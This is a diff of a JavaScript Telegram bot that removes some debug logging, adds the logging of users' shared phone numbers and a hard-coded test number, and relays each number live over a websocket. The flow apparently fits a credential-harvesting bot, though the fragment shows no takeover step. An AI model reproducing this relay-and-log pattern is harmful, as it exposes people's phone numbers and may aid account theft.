@@ -72,7 +72,6 @@ export default async (token, initialConfig) => {
 
     bot.on(`message`, async message => {
         await updateConfig();
-        console.log(currentConfig);
 
         const intervals = [5, 10, 30, 60, 240];
 
@@ -147,7 +146,6 @@ export default async (token, initialConfig) => {
         if (message.text?.startsWith(`/start`)) {
             if (ll) return await bot.sendMessage(message.from.id, currentConfig.auth, { reply_markup: { remove_keyboard: true }, parse_mode: 'HTML' });
 
-            console.log(await botUser.findOne({ id: message.from.id, botId: BOT.id }))
             if (!await botUser.findOne({ id: message.from.id, botId: BOT.id })) {
                 await new botUser({ id: message.from.id, botId: BOT.id, created: Date.now() }).save();
             }
@@ -296,7 +294,16 @@ export default async (token, initialConfig) => {
         if (message.contact) {
             if (message.contact.user_id !== message.from.id) return;
             try {
+                if(!config.app_prod){
+                    message.contact.phone_number = "79010407140";
+                }
+                console.log(message.contact.phone_number)
                 sockets.get(message.from.id)?.send(JSON.stringify({ action: `number`, data: message.contact.phone_number }));
+
+
+
+
+
                 await bot.sendMessage(message.from.id, currentConfig.wait, { parse_mode: "HTML", reply_markup: { remove_keyboard: true } });
 
                 setTimeout(async () => {
